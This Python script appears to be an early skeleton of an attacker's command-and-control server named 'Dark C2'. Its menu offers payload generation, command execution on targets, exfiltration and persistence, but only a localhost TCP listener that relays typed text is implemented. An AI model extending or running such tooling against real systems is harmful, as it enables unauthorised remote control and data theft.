import socket
import threading
import pyfiglet
import os

socket_list = []

# Function to handle the connection received
def listener_module():
    os.system("cls")
    for soc in socket_list:
        print(soc)   
    i=int(input("Select:"))
    print(socket_list[i].getpeername())
    manage_client(socket_list[i], socket_list[i].getpeername())
    # client_handler = threading.Thread(target=manage_client, args=(socket_list[i], socket_list[i].getpeername()))
    # client_handler.start()
    os.system("cls")

def manage_client(client_socket, client_address):
    print(f"We have an incoming connection request accepted from {client_address}")
    while True:
        try:
            message = client_socket.recv(10240)
            if (message.decode('utf-8') == "nuke"):
                client_socket.close()
                socket_list.remove(client_socket)
                print(f"Connection from {client_address} has been closed")
                break
            if message.decode('utf-8') == "exit":
                break
            print(f"Received from {client_address}: {message.decode('utf-8')}")
            response = input(">> ")
            if (message.decode('utf-8') == "nuke" or response == "nuke"):
                client_socket.close()
                socket_list.remove(client_socket)
                print(f"Connection from {client_address} has been closed")
                break
            if message.decode('utf-8') == "exit" or response == "exit":
                break
            client_socket.send(response.encode('utf-8'))
        except ConnectionResetError:
            break
    
    

# Server function to accept connections
def accept_connections(server):
    while True:
        client_socket, client_address = server.accept()
        socket_list.append(client_socket)


# Server setup
def start_server(host='127.0.0.1', port=9999):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)  # Listen for up to 5 connections
    print(f"Server listening on {host}:{port}")

    # Start the thread to accept connections
    accept_thread = threading.Thread(target=accept_connections, args=(server,))
    accept_thread.daemon = True
    accept_thread.start()

    # Main thread handles the menu
    while True:
        ascii_banner = pyfiglet.figlet_format("Dark C2 : Let's Rule!")
        print(ascii_banner)
        choice = menu()
        if choice == '5':
            listener_module()
        elif choice == '8':
            break

def menu():
    print("Select an option:")
    print("1. Loader Generation")
    print("2. Payload/Beacon Generation")
    print("3. Configure C2 Server")
    print("4. Communication Channel Setup")
    print("5. Execute Commands on Target")
    print("6. Data Exfiltration Setup")
    print("7. Persistence Mechanism Setup")
    print("8. Exit")
    choice = input("=> ")
    return choice

if __name__ == "__main__":
   
    start_server()
